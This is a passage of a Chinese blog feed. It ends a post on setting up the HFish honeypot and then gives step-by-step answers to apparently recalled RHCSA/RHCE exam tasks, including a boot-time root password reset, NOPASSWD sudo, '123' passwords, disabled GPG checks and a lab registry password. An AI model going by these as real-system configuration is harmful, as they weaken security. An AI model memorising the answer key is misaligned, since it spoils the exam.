https://repo.mysql.com/RPM-GPG-KEY-mysql-2022</code></p><p>导入新的GPGkey进行验证。</p><p>这儿是因为我选择装了mysql5.7，因为mysql8不是很轻量，仔细一看好像我的虚拟机设置的配置甚至都不是很够mysql用的，不过我大胆猜测直接装mysql8的yum源的话应该不会出这个问题。如果你不差资源，具体想装哪个mysql版本只需要在wget哪里选择</p><p><a href="https://downloads.mysql.com/archives/community/">https://downloads.mysql.com/archives/community/</a></p><p>相应的rpm即可。</p><p>然后启动mysql</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start mysqld</span><br></pre></td></tr></table></figure><p>又报错mysql启动失败，用 <code>netstat -tunlp</code> 发现3306端口被hfish-server的进程占用了，这是管理端自带的mysql蜜罐</p><p><img src="/2023/01/04/%E9%83%A8%E7%BD%B2Hfish%E8%9C%9C%E7%BD%90/2.png" alt="img"></p><p>去编辑/etc/my.cnf，在里面修改port为3309</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">port=3309 <span class="comment"># 添上这一行</span></span><br></pre></td></tr></table></figure><p>然后再 <code>systemctl start mysqld</code></p><p>通过 <code>cat /var/log/mysqld.log | grep &quot;password is&quot;</code>得到mysql生成的root密码，登录mysql</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;new password&#x27;</span>; # 修改密码，不改密码啥也做不了</span><br><span class="line"><span class="keyword">CREATE</span> DATABASE hfish # 建一个hfish的数据库</span><br></pre></td></tr></table></figure><p>然后在web管理页面把地址端口用户名密码，该配置的都配置了，即可使用</p><h2 id="放通自带的蜜罐"><a href="#放通自带的蜜罐" class="headerlink" title="放通自带的蜜罐"></a>放通自带的蜜罐</h2><p>控制节点自带下面这几个蜜罐</p><p><img src="/2023/01/04/%E9%83%A8%E7%BD%B2Hfish%E8%9C%9C%E7%BD%90/3.png" alt="img"></p><p>然后用 <code>firewall-cmd --add-port=XX --permnent</code>和 <code>firewall-cmd --reload</code>给端口都放了</p><p>虽然但是，ssh蜜罐本来是22号端口，可以选择修改ssh管理端口，然后把22端口放在外面给人打，但是我公司公网ip有点少，直接设个23端口然后nat出去得了。</p><h1 id="部署节点"><a href="#部署节点" class="headerlink" title="部署节点"></a>部署节点</h1><p>待续，我研究研究放哪合适部署了之后再写吧，薅羊毛关键在于可持续性薅。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>rhcsa+rhce通关攻略</title>
    <link href="https://blog.pillar.fun/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/"/>
    <id>https://blog.pillar.fun/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/</id>
    <published>2023-01-03T04:39:36.000Z</published>
    <updated>2023-03-06T08:23:05.851Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>做个RHCSA和RHCE的笔记好了</p><h1 id="RHCSA"><a href="#RHCSA" class="headerlink" title="RHCSA"></a>RHCSA</h1><h2 id="1-破密码"><a href="#1-破密码" class="headerlink" title="1. 破密码"></a>1. 破密码</h2><p>在登陆界面按E进入，然后在linux内核那一行加上 <code>console=tty0 rd.break</code>ctrl+X保存退出</p><p>重启之后进入tty0，需要做以下操作</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount -o remount,rw /sysroot <span class="comment"># 以读写的方式重新挂载sysroot</span></span><br><span class="line">chroot /sysroot <span class="comment"># 把/sysroot改成根目录</span></span><br><span class="line">passwd root <span class="comment"># 也可以使用 echo password | passwd --stdin root</span></span><br><span class="line"></span><br><span class="line">touch /.autorelabel <span class="comment"># 让selinux进行自动重新打标，避免权限问题</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><h2 id="2-修改ip地址和主机名"><a href="#2-修改ip地址和主机名" class="headerlink" title="2. 修改ip地址和主机名"></a>2. 修改ip地址和主机名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 新建一个网卡文件</span></span><br><span class="line">nmcli con add con-name rhcsa <span class="built_in">type</span> ethernet ifname eht0 ipv4.method manuual ipv4.addresses 1.2.3.4/24 ipv4.gateway 1.2.3.1 ipv4.dns 1.2.3.2 autoconnect yes </span><br><span class="line">nmcli con up rhcsa</span><br><span class="line"><span class="comment"># 修改原有的网卡</span></span><br><span class="line">nmcli con mod <span class="string">&quot;Wired connection 1&quot;</span> ipv4.me ma autoconnect yes ipv4.addresses 1.2.3.4/24 ipv4.gateway 1.2.3.1 ipv4.dns 1.2.3.2</span><br><span class="line">nmcli con up Wired connection 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改主机名</span></span><br><span class="line">hostnamectl set-hostname AAAA</span><br><span class="line"><span class="comment"># 查看主机名</span></span><br><span class="line">hostnamectl</span><br></pre></td></tr></table></figure><h2 id="3-配置yum库"><a href="#3-配置yum库" class="headerlink" title="3. 配置yum库"></a>3. 配置yum库</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1675048284604.png" alt="1675048284604"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 新建一个rhcsa.repo的文件</span></span><br><span class="line">vi /etc/yum.repo.d/rhcsa.repo </span><br><span class="line">内容为</span><br><span class="line">[baseos]</span><br><span class="line">name=baseos</span><br><span class="line">baseurl=http://repo.domain10.example.com/rhel80/BaseOS</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line"></span><br><span class="line">[appstream]</span><br><span class="line">name=appstream</span><br><span class="line">baseurl=http://repo.domain10.example.com/rhel80/AppStream</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line"></span><br><span class="line">yum repolist <span class="comment"># 刷新</span></span><br><span class="line">yum install -y vim <span class="comment"># 验证一下，看是否能安装</span></span><br></pre></td></tr></table></figure><h2 id="4-调试selinux"><a href="#4-调试selinux" class="headerlink" title="4. 调试selinux"></a>4. 调试selinux</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1675048241440.png" alt="1675048241440"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">semanage fcontext -a -t httpd_sys_content_t <span class="string">&#x27;/var/www/html(/.*)?&#x27;</span></span><br><span class="line">restorecon -RvF /var/www/html</span><br><span class="line"></span><br><span class="line">semanage port -a -t http_port_t -p tcp 82</span><br><span class="line">semanage port -l | grep http <span class="comment"># 回显中http_port_t有82端口</span></span><br><span class="line"></span><br><span class="line">firewall-cmd --add-port 82/tcp --per</span><br><span class="line">firewall-cmd --reload</span><br><span class="line">firewall-cmd --list-port <span class="comment"># 回显中有82/tcp</span></span><br><span class="line"></span><br><span class="line">systemctl restart httpd</span><br><span class="line"><span class="comment"># 在物理机上</span></span><br><span class="line">curl system1:82</span><br><span class="line"><span class="comment"># 有回显</span></span><br></pre></td></tr></table></figure><h2 id="5-创建用户账户"><a href="#5-创建用户账户" class="headerlink" title="5. 创建用户账户"></a>5. 创建用户账户</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1675051312669.png" alt="1675051312669"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">useradd natasha -G sysmgrs</span><br><span class="line">useradd harry -G sysmgrs</span><br><span class="line">useradd sarah -s &#x2F;sbin&#x2F;nologin</span><br><span class="line">echo 123 | passwd --stdin natasha</span><br><span class="line">echo 123 | passwd --stdin harry</span><br><span class="line">echo 123 | passwd --stdin sarah</span><br><span class="line"># 想检查的话可以 cat &#x2F;etc&#x2F;group</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="6-配置cron"><a href="#6-配置cron" class="headerlink" title="6. 配置cron"></a>6. 配置cron</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1675051801233.png" alt="1675051801233"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@system1 ~]# crontab -u natasha -e</span><br><span class="line">no crontab for natasha - using an empty one</span><br><span class="line">crontab: installing new crontab</span><br><span class="line">[root@system1 ~]# crontab -u natasha -l</span><br><span class="line">*&#x2F;5 * * * * logger \u201cEX200 in progress\u201d</span><br><span class="line">23 14 * * * &#x2F;bin&#x2F;echo enjia</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="7-创建协作目录"><a href="#7-创建协作目录" class="headerlink" title="7. 创建协作目录"></a>7. 创建协作目录</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1675051941117.png" alt="1675051941117"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir /home/managers</span><br><span class="line">chgrp sysmgrs /home/managers</span><br><span class="line">chmod g=rwx /home/managers</span><br><span class="line">chmod o=--- /home/managers/</span><br><span class="line">chmod g+s /home/managers/</span><br><span class="line">ls -ld /home/managers</span><br><span class="line"><span class="comment"># drwxrws---. 2 root sysmgrs 6 Jan 30 12:18 /home/managers/</span></span><br></pre></td></tr></table></figure><h2 id="8-配置NTP"><a href="#8-配置NTP" class="headerlink" title="8. 配置NTP"></a>8. 配置NTP</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1675053024143.png" alt="1675053024143"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/chrony.conf</span><br><span class="line"><span class="comment"># 在pool下面添加server host.domain10.example.com iburst</span></span><br><span class="line">systemctl restart chronyd</span><br><span class="line"><span class="comment"># 过半分钟左右</span></span><br><span class="line">chronyc sources</span><br><span class="line"><span class="comment"># 可以看到有一条即为添加成功</span></span><br></pre></td></tr></table></figure><h2 id="9-配置autofs"><a href="#9-配置autofs" class="headerlink" title="9. 配置autofs"></a>9. 配置autofs</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1675053611602.png" alt="1675053611602"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y nfs-utils autofs <span class="comment"># 安装相关的包</span></span><br><span class="line">vim /etc/auto.master</span><br><span class="line"><span class="comment"># 在 /misc   /etc/auto.misc 后类似的添加上</span></span><br><span class="line">/rhel   /etc/auto.user1</span><br><span class="line"></span><br><span class="line">vim /etc/auto.user1</span><br><span class="line">user1  -rw  host.domain10.example.com:/rhel/user1 <span class="comment"># 注意这里一定要用空格，不能用tab，否则会出现挂载不上的情况</span></span><br><span class="line"></span><br><span class="line">systemctl restart autofs</span><br><span class="line">systemctl <span class="built_in">enable</span> autofs</span><br><span class="line">ls -d /rhel</span><br><span class="line"></span><br><span class="line">su - user1</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">df -Th /rhel/user1</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="10-配置权限"><a href="#10-配置权限" class="headerlink" title="10. 配置权限"></a>10. 配置权限</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1675055721583.png" alt="1675055721583"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp /etc/fstab /var/tmp/fstab</span><br><span class="line">chown root /var/tmp/fstab</span><br><span class="line">chmod -x /var/tmp/fstab</span><br><span class="line">setfacl -m u:natasha:rw /var/tmp/fstab</span><br><span class="line">setfacl -m u:harry:--- /var/tmp/fstab</span><br><span class="line">chmod o=r-- /var/tmp/fstab</span><br></pre></td></tr></table></figure><h2 id="11-配置用户账户"><a href="#11-配置用户账户" class="headerlink" title="11. 配置用户账户"></a>11. 配置用户账户</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1675056219907.png" alt="1675056219907"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">useradd user2 --uid 3388</span><br><span class="line"><span class="built_in">echo</span> 123 | passwd --stdin user2</span><br></pre></td></tr></table></figure><h2 id="12-查找文件"><a href="#12-查找文件" class="headerlink" title="12. 查找文件"></a>12. 查找文件</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1675056327962.png" alt="1675056327962"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user user3 -<span class="built_in">exec</span> cp -a &#123;&#125; /root/dfiles/ \;</span><br><span class="line">vim /bin/repwis</span><br><span class="line"><span class="comment"># 内容</span></span><br><span class="line">find /usr -perm g+s -size +3M -size -5M -<span class="built_in">exec</span> basename &#123;&#125; &gt; /root/myfiles/find-file1.txt \;</span><br><span class="line">find /usr -perm u+s -size +30k -size -50k -<span class="built_in">exec</span> basename &#123;&#125; &gt; /root/myfiles/find-file2.txt \;</span><br></pre></td></tr></table></figure><h2 id="13-查找字符串"><a href="#13-查找字符串" class="headerlink" title="13. 查找字符串"></a>13. 查找字符串</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1675068801347.png" alt="1675068801347"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep re /usr/share/rhel.xml &gt; /root/files</span><br></pre></td></tr></table></figure><h2 id="14-创建存档"><a href="#14-创建存档" class="headerlink" title="14. 创建存档"></a>14. 创建存档</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1675068868743.png" alt="1675068868743"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y bzip2 tar</span><br><span class="line">tar -zcvf /root/books.tar.gz /usr/<span class="built_in">local</span> </span><br><span class="line">tar -jcvf /root/books.tar.bz2 /usr/<span class="built_in">local</span></span><br></pre></td></tr></table></figure><h2 id="15-调整逻辑卷大小"><a href="#15-调整逻辑卷大小" class="headerlink" title="15. 调整逻辑卷大小"></a>15. 调整逻辑卷大小</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1675069283457.png" alt="1675069283457"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 通过lvs查看有哪些lv是vo，通过vgs查看vo所属的vg是否还有空间给vo分</span></span><br><span class="line">lvextend /dev/vg-exam/vo1 -L 180M</span><br><span class="line">lvextend /dev/vg-exam/vo2 -L 180M</span><br><span class="line">lvs <span class="comment"># 查看vo是否扩容了</span></span><br><span class="line">df -Th /mnt/vo1 /mnt/vo2 <span class="comment"># 发现大小没变化，需要手动调整大小</span></span><br><span class="line">resize2fs /dev/vg-exam/vo1</span><br><span class="line">xfs_growfs /mnt/vo2</span><br><span class="line"><span class="comment"># 再Th就扩了</span></span><br></pre></td></tr></table></figure><h2 id="16-添加交换分区"><a href="#16-添加交换分区" class="headerlink" title="16.添加交换分区"></a>16.添加交换分区</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1675070979302.png" alt="1675070979302"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls /dev/vdb*</span><br><span class="line">fdisk /dev/vdb</span><br><span class="line">n</span><br><span class="line">default</span><br><span class="line">default</span><br><span class="line">default</span><br><span class="line">+567M</span><br><span class="line">w</span><br><span class="line"><span class="comment"># default就是直接按回车</span></span><br><span class="line">ls /dev/vdb* </span><br><span class="line"><span class="comment"># 如果没有出现多的vdb2</span></span><br><span class="line">partprobe</span><br><span class="line">mkswap /dev/vdb2</span><br><span class="line"><span class="comment"># 会出 UUID=843fc074-aae5-4f2e-aa91-a762030cf389，复制一下</span></span><br><span class="line">free -m <span class="comment"># 查看现在的虚拟内存</span></span><br><span class="line"><span class="comment"># 永久挂载</span></span><br><span class="line">vim /etc/fstab</span><br><span class="line"><span class="comment"># 写入</span></span><br><span class="line">UUID=843fc074-aae5-4f2e-aa91-a762030cf389  swap swap defaults 0 0</span><br><span class="line">swapon -a</span><br><span class="line">free -m</span><br><span class="line"><span class="comment"># 虚拟内存会增加567M</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="17-创建逻辑卷"><a href="#17-创建逻辑卷" class="headerlink" title="17. 创建逻辑卷"></a>17. 创建逻辑卷</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1675070355871.png" alt="1675070355871"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fdisk /dev/vdb</span><br><span class="line">n</span><br><span class="line">default</span><br><span class="line">default</span><br><span class="line">default</span><br><span class="line">+1G</span><br><span class="line">w</span><br><span class="line"></span><br><span class="line"><span class="comment"># 虽然45*20M=900M，但是多一点增加冗余</span></span><br><span class="line">ls /dev/vdb*</span><br><span class="line"><span class="comment"># 看到多出vdb3</span></span><br><span class="line">pvcreate /dev/vdb3</span><br><span class="line">vgcreate -s 20M npgroup /dev/vdb3</span><br><span class="line">lvcreate -n np -l 45 npgroup</span><br><span class="line">mkfs.ext3 /dev/npgroup/np</span><br><span class="line">mkdir /mnt/np</span><br><span class="line">vim /etc/fstab</span><br><span class="line"><span class="comment"># 写入</span></span><br><span class="line">/dev/npgroup/np /mnt/np ext3 default 0 0</span><br><span class="line">mount -a</span><br><span class="line">df -Th</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="18-创建vdo卷"><a href="#18-创建vdo卷" class="headerlink" title="18. 创建vdo卷"></a>18. 创建vdo卷</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1675074702889.png" alt="1675074702889"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y vdo<span class="comment"># 会多出一个vdc</span></span><br><span class="line">vdo create --name=vdoname --device=/dev/vdc --vdoLogicalSize=80G</span><br><span class="line"><span class="comment"># VDO instance 0 volume is ready at /dev/mapper/vdoname</span></span><br><span class="line">mkfs.xfs /dev/mapper/vdoname</span><br><span class="line">mkdir /vbark</span><br><span class="line">vim /etc/fstab</span><br><span class="line"><span class="comment"># 写入</span></span><br><span class="line">/dev/mapper/vdoname /vbark xfs _netdev 1 2</span><br><span class="line"></span><br><span class="line">mount -a</span><br><span class="line">df -Th</span><br><span class="line"><span class="comment"># /dev/mapper/vdoname      xfs        80G  604M   80G   1% /vbark</span></span><br></pre></td></tr></table></figure><h2 id="19-配置系统调优"><a href="#19-配置系统调优" class="headerlink" title="19 配置系统调优"></a>19 配置系统调优</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1675075073335.png" alt="1675075073335"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tuned-adm recommend</span><br><span class="line">tuned-adm list</span><br><span class="line">tuned-adm profile virtual-guest</span><br><span class="line">tuned-adm list</span><br></pre></td></tr></table></figure><h2 id="20-容器"><a href="#20-容器" class="headerlink" title="20. 容器"></a>20. 容器</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1675075337824.png" alt="1675075337824"></p><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1675153245986.png" alt="1675153245986"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/systemd/journald.conf</span><br><span class="line"><span class="comment"># 把Storage设成persistent</span></span><br><span class="line">systemctl restart systemd-journald</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制 /var/log/journal目录及任何子目录下的任何.journal复制到/home/elovodo/container_jouranl</span></span><br><span class="line">find /var/<span class="built_in">log</span>/journal -name <span class="string">&quot;*.journal&quot;</span> -<span class="built_in">exec</span> cp -a &#123;&#125; /home/elovodo/container_journal</span><br><span class="line">chown -R elovodo:elovodo /home/elovodo/container_journal/</span><br><span class="line"></span><br><span class="line">ssh elovodo@localhost</span><br><span class="line"><span class="comment"># 由此开始在elovodo用户上操作</span></span><br><span class="line">podman login utility.example.com:5000</span><br><span class="line"><span class="comment"># Username:gls</span></span><br><span class="line"><span class="comment"># Password:glshxwyz</span></span><br><span class="line"></span><br><span class="line">podman search rlogserver</span><br><span class="line">podman pull utility.example.com:5000/rlogserver</span><br><span class="line">podman imgaes <span class="comment"># 查看是否下载</span></span><br><span class="line">podman run -idt -v /home/elovodo/container_journal:/var/<span class="built_in">log</span>/journal:Z --name container_logserver utility.example.com:5000/rlogserver</span><br><span class="line">podman ps -a <span class="comment"># 查看是否运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建普通用户的systemd服务器配置文件目录</span></span><br><span class="line">mkdir ~/.config/systemd/user -p</span><br><span class="line"><span class="built_in">cd</span> ~/.config/systemd/user</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成podman容器服务文件</span></span><br><span class="line">podman generate systemd --new --files --name container_logserver</span><br><span class="line"><span class="comment"># 会生成container-container_logserver.service</span></span><br><span class="line"><span class="comment"># 修改名称为题目所要求的的</span></span><br><span class="line">mv container-container_logserver.service container_logserver.service</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止并删除容器</span></span><br><span class="line">podman stop container_logserver</span><br><span class="line">podman rm container_logserver</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启普通用户使用systemd管理自己服务的权限</span></span><br><span class="line">loginctl enable-linger</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载新的服务文件</span></span><br><span class="line">systemctl --user daemon-reload</span><br><span class="line"><span class="comment"># 设置文件开机启动，--now表示立即启动</span></span><br><span class="line">systemctl --user <span class="built_in">enable</span> container_logserver --now</span><br><span class="line">podman ps -a <span class="comment"># 看到有容器起来</span></span><br><span class="line">systemctl ---user status container_logserver </span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改umask为</span></span><br><span class="line">vim ~/.bashrc</span><br><span class="line"><span class="built_in">umask</span> 0077 <span class="comment"># 文件权限为rw-------，目录文件为rwx------</span></span><br><span class="line"></span><br><span class="line">systemctl reboot <span class="comment"># 重启后腰能查看到容器正常启动</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="21-修改密码有效期"><a href="#21-修改密码有效期" class="headerlink" title="21. 修改密码有效期"></a>21. 修改密码有效期</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1675155733525.png" alt="1675155733525"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chage -M 120 -m 7 glsgreat</span><br><span class="line">chage -l glsgreat</span><br></pre></td></tr></table></figure><h2 id="22-配置超级用户"><a href="#22-配置超级用户" class="headerlink" title="22. 配置超级用户"></a>22. 配置超级用户</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1675155985097.png" alt="1675155985097"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">visudo</span><br><span class="line"></span><br><span class="line">## Same thing without a password</span><br><span class="line"># %wheel        ALL&#x3D;(ALL)       NOPASSWD: ALL</span><br><span class="line"># 在这里加一行</span><br><span class="line">glsgood         ALL&#x3D;(ALL)       NOPASSWD: ALL</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="RHCE"><a href="#RHCE" class="headerlink" title="RHCE"></a>RHCE</h1><h2 id="1-配置安装ansible"><a href="#1-配置安装ansible" class="headerlink" title="1.  配置安装ansible"></a>1.  配置安装ansible</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1677044043907.png" alt="1677044043907"></p><p>环境没给control节点配yum库，需要我们自己配</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo yum-config-manager --add-repo url</span><br></pre></td></tr></table></figure><p>url考试应该会给。然后会发现没有gpgkey，所以vim进去把gpgcheck=0添上</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo yum install -y ansible</span><br></pre></td></tr></table></figure><p>即可安装好ansible。</p><p>然后按照题目所说，建立ansible文件夹和roles文件夹</p><p>创建inventory内容是</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line">[<span class="string">dev</span>]</span><br><span class="line"><span class="string">node1</span></span><br><span class="line">[<span class="string">test</span>]</span><br><span class="line"><span class="string">node2</span></span><br><span class="line">[<span class="string">prod</span>]</span><br><span class="line"><span class="string">node3</span></span><br><span class="line"><span class="string">node4</span></span><br><span class="line">[<span class="string">balancers</span>]</span><br><span class="line"><span class="string">node5</span></span><br><span class="line">[<span class="string">webservers:children</span>]</span><br><span class="line"><span class="string">prod</span></span><br></pre></td></tr></table></figure><p>理论上说应该在最前面吧ndoe1——5给他全写一遍，但是因为我们的操作都是按照组名来操作，而且gls的脚本也没用我们的inventory，所以其实可以不写，如果不放心考试的时候写一下也无妨。</p><p>ansible.cfg的内容是</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[defaults]</span><br><span class="line">inventory &#x3D; &#x2F;home&#x2F;greg&#x2F;ansible&#x2F;inventory</span><br><span class="line">roles_path &#x3D; &#x2F;home&#x2F;greg&#x2F;ansible&#x2F;roles:&#x2F;usr&#x2F;share&#x2F;ansible&#x2F;roles</span><br><span class="line">remote_user &#x3D; greg</span><br><span class="line">ask_pass &#x3D; false</span><br><span class="line"></span><br><span class="line">[privilege_escalation]</span><br><span class="line">become &#x3D; true</span><br><span class="line">become_method &#x3D; sudo </span><br><span class="line">become_user &#x3D; root</span><br><span class="line">become_ask_pass &#x3D; false</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>检查的话我偏向于使用</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ansible 组名 -a &#39;id&#39;</span><br></pre></td></tr></table></figure><p>每个组都有回显就没毛病</p><h2 id="2-创建和运行ansible临时命令"><a href="#2-创建和运行ansible临时命令" class="headerlink" title="2. 创建和运行ansible临时命令"></a>2. 创建和运行ansible临时命令</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1677055118966.png" alt="1677055118966"></p><p>编辑adhoc.sh</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ansible all -m yum_repository -a &quot;name=&#x27;EX294_BASE&#x27; description=&#x27;EX294 base software&#x27; baseurl=&#x27;http://repo.domainx.example.com/BaseOS&#x27; gpgcheck=1 gpgkey=&#x27;http://repo.domainx.example.com/RPM-GPG-KEY-redhat-release&#x27; enabled=1&quot;</span><br><span class="line">ansible all -m yum_repository -a &quot;name=&#x27;EX294_STREAM&#x27; description=&#x27;EX294 stream software&#x27; baseurl=&#x27;http://repo.domainx.example.com/AppStream&#x27; gpgcheck=1 gpgkey=&#x27;http://repo.domainx.example.com/RPM-GPG-KEY-redhat-release&#x27; enabled=1&quot;</span><br></pre></td></tr></table></figure><p>给予执行权限然后执行就行</p><h2 id="3-安装软件包"><a href="#3-安装软件包" class="headerlink" title="3. 安装软件包"></a>3. 安装软件包</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1677055232098.png" alt="1677055232098"></p><p>编辑packages.yml</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">install</span> <span class="string">pkg</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">dev,test,prod</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">use</span> <span class="string">yum</span> </span><br><span class="line">      <span class="attr">yum:</span></span><br><span class="line">        <span class="attr">name:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">php</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">mariadb</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">latest</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">install</span> <span class="string">rpm</span></span><br><span class="line">      <span class="attr">yum:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">&quot;@RPM Development Tools&quot;</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">latest</span></span><br><span class="line">      <span class="attr">when:</span> <span class="string">&quot;&#x27;dev&#x27; in group_names&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">install</span> <span class="string">all</span></span><br><span class="line">      <span class="attr">yum:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">latest</span></span><br><span class="line">      <span class="attr">when:</span> <span class="string">&#x27;&quot;dev&quot; in group_names&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="4-使用RHEL系统角色"><a href="#4-使用RHEL系统角色" class="headerlink" title="4. 使用RHEL系统角色"></a>4. 